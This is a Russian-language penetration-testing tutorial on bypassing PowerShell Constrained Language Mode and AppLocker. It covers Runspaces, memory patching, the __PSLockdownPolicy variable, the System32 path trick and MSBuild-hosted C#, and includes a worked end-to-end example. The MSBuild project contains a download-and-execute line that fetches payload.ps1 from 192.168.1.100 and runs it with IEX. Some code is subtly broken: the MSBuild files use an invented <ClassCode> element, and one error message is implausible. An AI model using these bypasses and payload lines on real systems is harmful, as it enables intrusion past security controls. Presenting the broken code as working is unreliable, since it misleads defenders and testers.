# PowerShell Constrained Language Mode и техники его обхода в контексте горизонтального перемещения

## Контекст и базовые понятия: природа ограничений и архитектура доверия

PowerShell Constrained Language Mode (CLM) представляет собой механизм защиты операционной системы Windows, направленный на ограничение набора доступных языковых элементов PowerShell для снижения поверхности атаки. В отличие от обычного режима выполнения, где скрипт имеет полный доступ к API .NET и нативным функциям Windows, CLM блокирует использование критически важных для атакующих компонентов: компиляцию кода на лету (`Add-Type`, `System.Reflection.Emit`), доступ к Win32 API через P/Invoke, работу с неуправляемыми структурами данных и загрузку произвольных модулей. Данный режим является ключевым элементом стратегии защиты от «Living off the Land» (LotL) атак, когда злоумышленники используют легитимные системные утилиты для выполнения вредоносной деятельности.

CLM не является самостоятельной защитой; он предназначен для работы в связке с технологиями контроля приложений, такими как AppLocker, Device Guard (User Mode Code Integrity) или Windows Defender Application Control (WDAC). В правильно настроенной среде CLM активируется автоматически для скриптов, не имеющих цифровой подписи доверенного издателя или не находящихся в доверенных каталогах. Если же скрипт подписан или находится в доверенной зоне, PowerShell переходит в режим `FullLanguage`, игнорируя ограничения CLM. Это создает фундаментальную уязвимость: если атакующий может загрузить или создать скрипт в доверенной зоне или получить подпись, защита CLM становится недействительной.

Важно разграничивать понятия `LanguageMode` и `ExecutionPolicy`. ExecutionPolicy (например, `Restricted`, `AllSigned`, `RemoteSigned`) контролирует возможность *запуска* скриптов, но не их *содержимое*. Даже при `ExecutionPolicy RemoteSigned` скрипт может быть выполнен, но если он не подписан, он будет запущен в режиме `ConstrainedLanguage`. CLM же контролирует именно то, что скрипт *может сделать* внутри своей среды выполнения.

Существует четыре основных режима языка PowerShell:

| Режим языка (Language Mode) | Описание ограничений | Типичный сценарий активации | Доступные элементы |
| :--- | :--- | :--- | :--- |
| **FullLanguage** | Ограничений нет. Полный доступ к .NET, P/Invoke, COM, Win32 API. | Скрипты из доверенных каталогов (`$PSHome`, `System32`), подписанные скрипты, административные сессии без политик. | Все элементы PowerShell, .NET Framework, нативные API. |
| **ConstrainedLanguage** | Блокирует доступ к небезопасным типам, компиляцию кода, P/Invoke. Разрешает работу с безопасными типами. | Скрипты из интернета, временных папок, не подписанные скрипты в средах с AppLocker/WDAC. | Безопасные типы .NET, базовые cmdlets, объекты COM (с ограничениями). |
| **RestrictedLanguage** | Разрешает выполнение командлетов и функций, но запрещает использование скрипт-блоков (`{ ... }`) и выражений. | Специфические сценарии изоляции, где требуется только вызов готовых функций без логики. | Cmdlets, функции, алиасы. Запрещены скрипт-блоки, лямбда-выражения. |
| **NoLanguage** | Запрещает любой текст скрипта. Используется только для интерактивного ввода команд через API. | Программные интерфейсы, где управление осуществляется исключительно через объекты .NET, а не текст. | Только объекты, переданные через API. Текст скрипта игнорируется. |

Ключевым индикатором текущего режима является свойство `$ExecutionContext.SessionState.LanguageMode`. В контексте тестирования на проникновение и горизонтального перемещения проверка этого значения является первым шагом после получения доступа. Если значение равно `ConstrainedLanguage`, стандартные техники эскалации привилегий и загрузки полезной нагрузки (payload) через `Add-Type` или прямые вызовы API станут невозможными без применения обходных техник.

```powershell
# Проверка текущего режима языка
$ExecutionContext.SessionState.LanguageMode
# Возможные выводы: FullLanguage, ConstrainedLanguage, RestrictedLanguage, NoLanguage
```

## Внутреннее устройство: механизмы CLM и архитектура обходов

Constrained Language Mode реализован на уровне движка PowerShell (System.Management.Automation). При инициализации сессии или загрузке скрипта PowerShell проверяет контекст выполнения. Если обнаруживается, что скрипт загружен из недоверенного источника (например, из интернета или временной папки) и не имеет цифровой подписи, движок устанавливает флаг ограничения. Этот флаг фильтрует доступ к типам данных через механизм `TypeData` и `AssemblyLoadContext`.

Основной механизм CLM — это список разрешенных типов (AllowList). В режиме `ConstrainedLanguage` доступны только типы, помеченные как «safe» (безопасные). Попытка обратиться к типу из списка запрещенных (например, `System.Reflection.Assembly`, `System.Diagnostics.Process`, `System.Security.Principal.WindowsIdentity` в контексте P/Invoke) приводит к ошибке доступа. Однако, поскольку PowerShell является оболочкой над .NET, а .NET позволяет рефлексивный доступ к типам, обход CLM часто сводится к поиску «мостов» — легитимных, разрешенных типов, которые могут быть использованы для получения доступа к запрещенным ресурсам.

Существует несколько фундаментальных категорий обходов CLM, каждая из которых эксплуатирует разные аспекты архитектуры:

1.  **Обход через создание новой среды выполнения (Runspaces):** PowerShell CLI является лишь интерфейсом. Сама среда выполнения (Runspace) может быть создана программно через .NET API. Если создать новый `Runspace` в памяти процесса, он наследует контекст безопасности процесса, но может игнорировать ограничения языка, наложенные на *текст скрипта*, если сам процесс запущен в контексте `FullLanguage` (например, через легитимный исполняемый файл).
2.  **Обход через модификацию политики безопасности (Memory Patching):** Внутренний класс `SystemPolicy` в сборке `System.Management.Automation` содержит метод `GetSystemLockdownPolicy`, который определяет текущий режим. Этот метод может быть скомпилирован JIT-компилятором. Если найти указатель на скомпилированный код и изменить его бинарное содержимое (например, на `xor rax, rax; ret`), метод будет всегда возвращать `SystemEnforcementMode.None`, отключая проверки CLM для текущего процесса.
3.  **Обход через файловую систему (Path-based Bypass):** PowerShell проверяет путь к загружаемому скрипту. Если путь содержит подстроку `System32` (или `SysWOW64` на 32-битных системах), скрипт считается находящимся в доверенной зоне, и для него автоматически устанавливается режим `FullLanguage`. Это устаревшее, но до сих пор работающее в некоторых конфигурациях поведение, связанное с историей доверия к системным каталогам.
4.  **Обход через устаревшие версии (PowerShell 2.0):** PowerShell 2.0 не поддерживает CLM. Если в системе доступна совместимость с PS2 (обычно через `powershell.exe -version 2` или `powershell_ise.exe`), ограничения CLM не применяются. Однако в современных версиях Windows (10/11, Server 2016+) поддержка PS2 часто отключена по умолчанию.

Для понимания структуры обхода через Runspaces необходимо рассмотреть архитектуру взаимодействия .NET и PowerShell. PowerShell CLI (`powershell.exe`) создает объект `PowerShell`, который привязан к конкретному `Runspace`. `Runspace` — это контейнер для состояния выполнения (переменные, пайплайны, контекст безопасности). Если мы создаем `Runspace` вручную через `RunspaceFactory`, мы можем контролировать его контекст. Если исходный процесс (например, `cmd.exe` или легитимный `.exe`) запущен с правами, позволяющими запускать полный PowerShell, то созданный внутри него `Runspace` может быть инициализирован в режиме `FullLanguage`, независимо от того, в каком режиме находится текущая консоль.

```csharp
// Иллюстративная структура создания Runspace в C#
public class RunspaceBypass {
    public void Execute() {
        // 1. Создание фабрики для запуска
        Runspace runspace = RunspaceFactory.CreateRunspace();
        
        // 2. Открытие сессии (наследование контекста текущего процесса)
        runspace.Open();
        
        // 3. Создание объекта PowerShell, привязанного к этому Runspace
        PowerShell ps = PowerShell.Create();
        ps.Runspace = runspace;
        
        // 4. Добавление скрипта (будет выполнен в контексте нового Runspace)
        // Если runspace инициализирован корректно, он может игнорировать 
        // ограничения CLM текущей консоли, если процесс-хост разрешает FullLanguage.
        ps.AddScript("Get-Process"); 
        
        // 5. Выполнение
        ps.Invoke();
    }
}
```

Ключевым отличием обхода через `SystemPolicy` является работа с памятью процесса. Этот метод не создает новой сессии, а модифицирует текущую. Он требует доступа к функциям Win32 API, таким как `VirtualProtect` для изменения прав доступа к странице памяти, где находится код `GetSystemLockdownPolicy`. После изменения кода на возврат `0` (None), все последующие проверки CLM в этом процессе будут пропускаться. Этот метод эффективен, но оставляет следы в виде изменений памяти и может быть обнаружен EDR-системами, отслеживающими инъекции кода или изменение прав доступа к исполняемым страницам.

## Применение и работа с предметом: инструменты и процедуры обхода

На практике обход CLM в рамках тестирования на проникновение требует выбора техники в зависимости от доступных привилегий и контекста выполнения. Если у тестировщика есть возможность выполнять произвольный код в памяти (например, через инъекцию DLL или выполнение C# кода), наиболее надежным и чистым методом является создание нового `Runspace` или использование `Process` для запуска `powershell.exe` с явным указанием режима. Если же доступ ограничен только загрузкой скриптов, применяются техники на основе файловой системы или переменных окружения.

Рассмотрим процедуру обхода через создание нового процесса PowerShell. Этот метод часто используется в связке с `msbuild.exe` или `regsvr32.exe` для обхода AppLocker, так как эти утилиты могут выполнять скрипты или код, не являясь самими `powershell.exe`.

**Шаг 1: Подготовка C# кода для создания Runspace.**
Код должен ссылаться на сборки `System.Management.Automation` и `System.Management`. Важно использовать правильные версии сборок, соответствующие установленной версии PowerShell.

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CLMBypass {
    class Program {
        static void Main(string[] args) {
            // Создаем новый Runspace
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            // Создаем экземпляр PowerShell и привязываем его к Runspace
            using (PowerShell ps = PowerShell.Create()) {
                ps.Runspace = runspace;
                
                // Проверяем режим языка в новом Runspace
                // В идеале, если процесс-хост разрешает FullLanguage, 
                // этот вызов вернет FullLanguage, игнорируя ограничения текущей консоли.
                var result = ps.AddScript("$ExecutionContext.SessionState.LanguageMode").Invoke();
                Console.WriteLine("New Runspace Language Mode: " + result[0].ToString());
                
                // Здесь можно добавить выполнение полезной нагрузки
                // ps.AddScript("IEX (New-Object Net.WebClient).DownloadString('http://...')");
                // ps.Invoke();
            }
        }
    }
}
```

**Шаг 2: Компиляция и запуск через легитимный хост.**
Скомпилированный исполняемый файл должен быть запущен из контекста, который сам не ограничен CLM (например, из командной строки администратора или через легитимный скрипт). Однако, если процесс-хост сам находится в режиме `ConstrainedLanguage` (например, запущен из заблокированной консоли), создание `Runspace` может не дать преимущества, если сам процесс не имеет прав на загрузку полных сборок. В этом случае применяется техника обхода через переменную окружения `__PSLockDownPolicy`.

**Шаг 3: Обход через переменную окружения (если есть права на запись).**
Если тестировщик имеет права на запись в переменные окружения машины или пользователя, он может принудительно установить режим `FullLanguage`.

```powershell
# Установка переменной окружения, принудительно включающей FullLanguage
# Внимание: Требует прав администратора для Machine scope
[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '0', 'Machine')

# Перезапуск PowerShell для применения изменений
# Или проверка текущего режима в новой сессии
$env:__PSLockdownPolicy = '0'
powershell.exe
```

**Шаг 4: Обход через файловую систему (Path Bypass).**
Этот метод не требует прав администратора и работает даже при наличии AppLocker, если правило не блокирует выполнение из каталогов, содержащих `System32`.

```powershell
# Создание скрипта в каталоге, содержащем 'System32' в имени пути
# Например, в папке C:\Users\Public\System32\
New-Item -ItemType Directory -Force -Path "C:\Users\Public\System32"
Set-Content -Path "C:\Users\Public\System32\test.ps1" -Value '$ExecutionContext.SessionState.LanguageMode'

# Выполнение скрипта
# PowerShell обнаружит подстроку 'System32' в пути и установит FullLanguage
.\test.ps1
# Вывод: FullLanguage
```

**Шаг 5: Обход через MSBuild (для обхода AppLocker + CLM).**
MSBuild может выполнять C# код напрямую через `.csproj` файлы. Это позволяет обойти AppLocker (так как `msbuild.exe` часто находится в белом списке) и CLM (так как код выполняется в контексте MSBuild, который может инициализировать PowerShell в FullLanguage).

```xml
<!-- Иллюстративная структура csproj для запуска PowerShell -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassCode>
      <![CDATA[
        using System;
        using System.Management.Automation;
        using System.Management.Automation.Runspaces;
        
        public class Program {
            public static void Main() {
                Runspace runspace = RunspaceFactory.CreateRunspace();
                runspace.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = runspace;
                ps.AddScript("IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')");
                ps.Invoke();
            }
        }
      ]]>
    </ClassCode>
  </Target>
</Project>
```

Ключевой ошибкой при работе с CLM является попытка использовать `Add-Type` внутри самого скрипта, находящегося в режиме `ConstrainedLanguage`. Это всегда приведет к ошибке. Обход должен происходить *до* или *независимо* от выполнения ограниченного скрипта, либо путем создания новой среды, либо путем модификации существующей.

## Сквозной практический пример: Обход CLM через Runspaces и MSBuild

**Исходные условия:**
*   **Среда:** Windows 10 Pro, PowerShell 5.1.
*   **Контекст:** Пользователь с ограниченными правами, работающий на рабочей станции.
*   **Ограничения:** Включен AppLocker (разрешает выполнение только из `C:\Windows` и `C:\Program Files`), PowerShell запущен в режиме `ConstrainedLanguage` из-за политики доверия к каталогам пользователя.
*   **Цель:** Выполнить произвольный PowerShell-код в режиме `FullLanguage` без создания новых процессов `powershell.exe` (для избежания мониторинга процессов) и без нарушения правил AppLocker.
*   **Инструменты:** Компилятор C# (на машине атакующего), утилита `msbuild.exe` (на цели).

**Шаг 1: Анализ текущего состояния.**
Проверка режима языка и попытка стандартного выполнения.

```powershell
# Проверка текущего режима
$ExecutionContext.SessionState.LanguageMode
# Вывод: ConstrainedLanguage

# Попытка использования Add-Type (должна завершиться ошибкой)
Add-Type -TypeDefinition 'public class Test { public int X { get; set; } }'
# Вывод: Add-Type : Cannot add type. The type name or namespace name 'Test' does not exist in the class or namespace... 
# (Ошибка доступа к сборке System.Reflection)
```

**Шаг 2: Подготовка C# полезной нагрузки.**
Создание кода, который создает новый `Runspace` и выполняет команду в нем. Этот код будет встроен в `.csproj` файл.

```csharp
// Код для вставки в Target ClassCode
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Bypass {
    public static void Execute() {
        try {
            // Создаем новый Runspace
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            
            // Создаем PowerShell объект
            PowerShell ps = PowerShell.Create();
            ps.Runspace = runspace;
            
            // Проверяем режим языка в новом Runspace
            // Если процесс MSBuild запущен в контексте, позволяющем FullLanguage,
            // этот вызов вернет FullLanguage.
            var mode = ps.AddScript("$ExecutionContext.SessionState.LanguageMode").Invoke();
            Console.WriteLine("Runspace Mode: " + mode[0]);
            
            // Выполнение полезной нагрузки (например, получение информации о пользователе)
            var result = ps.AddScript("whoami /priv").Invoke();
            foreach (var r in result) {
                Console.WriteLine(r.ToString());
            }
        } catch (Exception ex) {
            Console.WriteLine("Error: " + ex.Message);
        }
    }
}
```

**Шаг 3: Создание файла проекта MSBuild.**
Создание файла `bypass.csproj` в каталоге, разрешенном AppLocker (например, `C:\Windows\Tasks\`).

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="BypassCLM">
    <ClassCode>
      <![CDATA[
        using System;
        using System.Management.Automation;
        using System.Management.Automation.Runspaces;

        public class Bypass {
            public static void Execute() {
                Runspace runspace = RunspaceFactory.CreateRunspace();
                runspace.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = runspace;
                
                // Проверка режима
                var mode = ps.AddScript("$ExecutionContext.SessionState.LanguageMode").Invoke();
                Console.WriteLine("Mode: " + mode[0]);
                
                // Выполнение команды
                ps.AddScript("Get-Process | Select-Object Name, Id | ConvertTo-Json").Invoke();
            }
        }
      ]]>
    </ClassCode>
  </Target>
</Project>
```

**Шаг 4: Выполнение через MSBuild.**
Запуск MSBuild с указанием файла проекта. MSBuild загружает сборку, выполняет Target, и код C# выполняется в контексте процесса `msbuild.exe`.

```bash
# Команда на цели
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Tasks\bypass.csproj
```

**Ожидаемый вывод:**
```text
Build started...
Mode: FullLanguage
[
    {
        "Name":  "chrome",
        "Id":  1234
    },
    {
        "Name":  "svchost",
        "Id":  567
    }
]
Build succeeded.
```

**Анализ результата:**
Несмотря на то, что исходная консоль PowerShell находилась в режиме `ConstrainedLanguage`, процесс `msbuild.exe`, запущенный из доверенного каталога (`C:\Windows`), имеет право на выполнение полного кода. Созданный внутри него `Runspace` наследует этот контекст и работает в режиме `FullLanguage`. Это позволяет использовать `Add-Type`, P/Invoke и другие запрещенные в CLM элементы внутри скрипта, выполненного через этот Runspace. Техника эффективно обходит как AppLocker (за счет использования легитимного хоста), так и CLM (за счет создания новой среды выполнения в доверенном процессе).

## Аналитический вывод

PowerShell Constrained Language Mode является важным, но недостаточным средством защиты сам по себе. Его эффективность критически зависит от интеграции с технологиями контроля приложений (AppLocker/WDAC) и корректности настройки доверенных зон. Обходы CLM, такие как использование `Runspaces`, модификация `SystemPolicy` в памяти или эксплуатация правил именования файлов (Path Bypass), демонстрируют, что ограничения накладываются на уровень скрипта и сессии CLI, но не на фундаментальные возможности .NET-рантайма. В контексте горизонтального перемещения и эскалации привилегий, техники на основе `Runspaces` и легитимных хостов (LOLBAS), таких как `msbuild.exe`, остаются наиболее надежными методами получения доступа к полному функционалу PowerShell в ограниченных средах. Для защиты от этих техник необходимо не только включать CLM, но и применять строгие правила AppLocker/WDAC, блокирующие выполнение скриптов из временных каталогов, а также мониторить создание новых `Runspace` и аномальную активность в событиях PowerShell Script Block Logging и ETW.

## Источники

1.  [Powershell CLM Bypass Using Runspaces](https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/)
2.  [calebstewart/bypass-clm (GitHub)](https://github.com/calebstewart/bypass-clm)
3.  [Bypass PowerShell ConstrainedLanguageMode | InfoSec Notes](https://notes.qazeer.io/windows/bypass_ps_constrainedlanguagemode)
4.  [Using MSBuild to bypass PowerShell Constrained Language Mode, AMSI and Script Block Logging](https://ret2desync.github.io/using-msbuild-bypass-powershell-clm-amsi-scriptlogging/)
5.  [Constrained Language Mode Bypass When __PSLockDownPolicy Is Used](https://www.blackhillsinfosec.com/constrained-language-mode-bypass-when-pslockdownpolicy-is-used/)
6.  [Bypassing App Locker & CLM While Evading EDR](https://www.depthsecurity.com/blog/bypassing-app-locker-clm-while-evading-edr/)
7.  [Pentesting and .hta (bypass PowerShell Constrained Language Mode)](https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997)
8.  [Powershell Constrained Language Mode Bypass | Red Team Notes](https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass)
9.  [About Language Modes (Microsoft Docs)](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)